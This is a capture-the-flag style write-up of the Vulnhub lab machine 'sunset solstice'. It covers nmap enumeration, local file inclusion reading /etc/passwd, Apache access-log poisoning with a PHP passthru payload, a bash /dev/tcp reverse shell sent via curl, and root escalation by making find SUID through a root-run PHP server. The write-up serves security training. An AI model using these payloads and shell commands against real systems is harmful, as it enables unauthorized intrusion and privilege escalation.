---
title: Vulnhub - sunset solstice
description: My writeup on sunset solstice box.
categories:
 - vulnhub
tags: vulnhub lfi php suid find logpoisoning
---

![](https://i.pinimg.com/originals/54/1d/f7/541df746fb87996ad2ab1dfbea249cea.png)

Hi all, let's pwn this!

You can find the machine there > [sunset solstice](https://www.vulnhub.com/entry/sunset-solstice,499/){:target="_blank"}

## Enumeration/Reconnaissance

Let's start always with nmap.

```
$ ip=192.168.1.9
$ nmap -sC -sV -p- -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-01 14:09 EEST
Nmap scan report for solstice.zte.com.cn (192.168.1.9)
Host is up (0.00038s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.1.9:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)
|   256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)
|_  256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)
25/tcp    open  smtp        Exim smtpd 4.92
| smtp-commands: solstice.zte.com.cn Hello 0xatom.zte.com.cn [192.168.1.16], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
2121/tcp  open  ftp         pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drws------   2 www-data www-data     4096 Jun 18 02:39 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.1.9:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
3128/tcp  open  http-proxy  Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
8593/tcp  open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
54787/tcp open  http        PHP cli server 5.5 or later (PHP 7.3.14-1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
62524/tcp open  ftp         FreeFloat ftpd 1.00
MAC Address: 08:00:27:86:82:E4 (Oracle VirtualBox virtual NIC)
Service Info: Host: SOLSTICE; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```

After lot of enumeration, i found an entry point on port `8593` there we can see this page : 

![](https://i.imgur.com/8mkXJqb.png)

If we click on `Book List` button we can see this on URL : `/index.php?book=list`, i tried for LFI and bingo got it! 

```
$ curl http://$ip:8593/index.php\?book\=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:107:118::/var/lib/saned:/usr/sbin/nologin
colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false
miguel:x:1000:1000:,,,:/home/miguel:/bin/bash
uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin
smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin
```

## Log poisoning - shell as www-data

Now i tried to read log files, and bingo we can read `/var/log/apache2/access.log` so now we can take a reverse shell! :D

Port `8593` runs on `PHP cli server`, so we cant send our payload on port `8593`. We will send it to port `80` because `/var/log/apache2/access.log` is apache log file.

```
$ nc $ip 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
HTTP/1.1 400 Bad Request
Date: Wed, 01 Jul 2020 11:32:45 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80</address>
</body></html>
```

Let's test it now.

`http://$ip:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=whoami`

In the end of the output we can see this : `www-data` , perfect now let's take a reverse shell i'll use this :

`bash -c 'bash -i >& /dev/tcp/$your_ip/5555 0>&1'` 

But first we have to URL encoded it & then send it.

```
$ curl "http://$ip:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.16%2F5555%200%3E%261%27"
```

We have shell!

```
$ nc -lvp 5555
listening on [any] 5555 ...
www-data@solstice:/var/tmp/webserver$ ^Z #ctrl + z
[1]+  Stopped                 nc -lvp 5555
$ stty -raw echo
$ fg
www-data@solstice:/var/tmp/webserver$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@solstice:/var/tmp/webserver$
```

## www-data -> root

After lot of enumeration, i noticed only 1 thing if you run `ps aux | grep root` you can see this : 

`root       423  0.0  2.0 196744 21056 ?        S    07:45   0:00 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/`

It's a php local server, `-t` specify the document for the built-in web server so if we go there we can see that we can edit the file.

```
www-data@solstice:/var/tmp/sv$ ls -la
ls -la
total 12
drwsrwxrwx 2 root root 4096 Jun 26 15:36 .
drwxrwxrwt 9 root root 4096 Jul  1 07:45 ..
-rwxrwxrwx 1 root root   36 Jun 19 00:01 index.php
```

Server is running as root, so we can edit the file and add our payload in, we can do a trick and make the `find` binary SUID! ;-)

```
www-data@solstice:/var/tmp/sv$ > index.php
www-data@solstice:/var/tmp/sv$ printf "<?php\nsystem('chmod o+x /usr/bin/find; chmod +s /usr/bin/find');\n?>" > index.php
www-data@solstice:/var/tmp/sv$ cat index.php
<?php
system('chmod o+x /usr/bin/find; chmod +s /usr/bin/find');
?>
www-data@solstice:/var/tmp/sv$ curl http://127.0.0.1:57/index.php
www-data@solstice:/var/tmp/sv$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
whoami;id
root
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

Let's read the flag.

```
# cat /root/root.txt

No ascii art for you >:(

Thanks for playing! - Felipe Winsnes (@whitecr0wz)

f950998f0d484a2ef1ea83ed4f42bbca
```

Interesting privesc! :)
